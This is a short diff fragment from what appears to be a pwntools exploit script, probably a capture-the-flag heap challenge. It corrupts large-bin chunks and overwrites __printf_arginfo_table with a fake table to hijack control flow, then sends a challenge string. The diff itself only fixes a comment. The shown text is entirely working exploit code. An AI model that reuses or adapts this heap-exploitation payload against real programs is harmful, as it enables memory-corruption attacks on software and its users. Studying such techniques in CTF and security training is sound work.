@@ -84,7 +84,7 @@ payload = p64(largebin) + p64(largebin) + p64(heap0) + p64(__printf_arginfo_tabl
 add(0x500,fake_table)           #4/former 2
 fre(2)
 edi(0,payload)
-add(0x530,"put the unsorted chunk into large bin")          ##4
+add(0x530,"put the unsorted chunk into large bin")          #5
 # fre(4)
 # gdb.attach(p,"b*$rebase(0x1d98)")
 p.sendlineafter("choice: \n","H4cked_6y_Seg_Tree")
